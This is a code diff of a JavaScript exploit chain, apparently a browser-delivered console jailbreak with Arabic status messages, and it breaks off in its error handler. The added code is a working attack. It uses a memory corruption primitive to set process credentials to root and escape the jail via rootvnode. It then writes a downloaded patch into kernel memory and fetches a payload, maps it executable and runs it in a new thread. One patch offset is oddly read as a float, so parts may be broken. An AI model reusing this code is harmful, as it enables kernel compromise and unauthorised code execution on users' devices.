@@ -173,4 +173,83 @@ let allDone = false, jailbroken = false, kpatched = false, payloadRunning = fals
     await new Promise((r) => setTimeout(r, 3000));
     forceGarbageCollection();
 
-    const PRIMITIVE_LOUD = true;
+    p = await establishPrimitive(off, retryBenign);
+    if (!p) return;
+    clearRetry();
+
+    jailbroken = !DO_JB;
+    kpatched = !DO_PATCH;
+    payloadRunning = !DO_PAYLOAD;
+
+    if (DO_JB) {
+      state("جاري كسر حماية النواة...", "warn");
+      await new Promise((r) => setTimeout(r, 0));
+      const ucred = p.read64(p.ucredPtr);
+      const cr_uid = p.read32(ucred.add(4));
+      if (cr_uid !== 0) {
+        p.write32(ucred.add(4), 0);
+        p.write32(ucred.add(8), 0);
+        p.write32(ucred.add(12), 0);
+        p.write32(ucred.add(16), 1);
+        p.write64(ucred.add(0x30), off.k_prison0);
+      }
+      const filedesc = p.read64(p.procPtr.add(0x48));
+      const fdir = p.read64(filedesc.add(0x10));
+      const fcdir = p.read64(filedesc.add(0x18));
+      p.write64(fdir.add(0x10), off.k_rootvnode);
+      p.write64(fcdir.add(0x10), off.k_rootvnode);
+      jailbroken = true;
+      mark("JAILBREAK-OK");
+    }
+
+    if (DO_PATCH) {
+      state("جاري تطبيق باتش الاستقرار والتثبيت...", "warn");
+      await new Promise((r) => setTimeout(r, 0));
+      const response = await fetch(KPATCH_FILE);
+      if (!response.ok) throw new Error("فشل تحميل ملف الباتش: " + response.statusText);
+      const blob = await response.arrayBuffer();
+      const view = new DataView(blob);
+      if (view.getUint32(0, true) !== 0x50344b50) throw new Error("ملف الباتش غير صالح");
+      const count = view.getUint32(4, true);
+      let pos = 8;
+      for (let i = 0; i < count; i++) {
+        const targetRva = view.getFloat64(pos, true);
+        const len = view.getUint32(pos + 8, true);
+        pos += 12;
+        const patchData = new Uint8Array(blob, pos, len);
+        pos += (len + 3) & ~3;
+        const dest = p.kbase.add(targetRva);
+        p.kwrite(dest, patchData);
+      }
+      kpatched = true;
+      mark("KPATCH-OK", "applied count=" + count);
+    }
+
+    if (DO_PAYLOAD) {
+      state("جاري إطلاق حمولة التعديل الخاصة بمتجرك...", "warn");
+      await new Promise((r) => setTimeout(r, 0));
+      const response = await fetch(PAYLOAD_FILE);
+      if (!response.ok) throw new Error("فشل في تحميل ملف الحمولة الرئيسي: " + response.statusText);
+      const blob = await response.arrayBuffer();
+      const codeSize = (blob.byteLength + 0xfff) & ~0xfff;
+      const stackSize = 0x100000;
+      const totalSize = codeSize + stackSize;
+      const payloadMap = p.syscall(SYS.mmap, 0, totalSize, 7, 0x1002, -1, 0);
+      if (payloadMap.low === 0xffffffff) throw new Error("فشل تخصيص مساحة الحمولة العشوائية");
+      const payloadCode = payloadMap;
+      const payloadStack = payloadMap.add(codeSize);
+      p.wwrite(payloadCode, new Uint8Array(blob));
+      const pthread_t = p.walloc(8);
+      const attr = p.walloc(0x10);
+      p.syscall(SYS.mmap, attr, 0x10, 3, 0x1002, -1, 0);
+      p.wcall(off.wk___imp_pthread_create, pthread_t, 0, payloadCode, payloadStack.add(stackSize), totalSize);
+      payloadRunning = true;
+      mark("PAYLOAD-OK", "launched size=" + blob.byteLength);
+    }
+
+    allDone = true;
+    state("اكتمل تشغيل التعديلة بنجاح تام!", "ok");
+    finishUI(true);
+
+  } catch (e) {
+    mark("EXPLOIT-THREW", e.message);
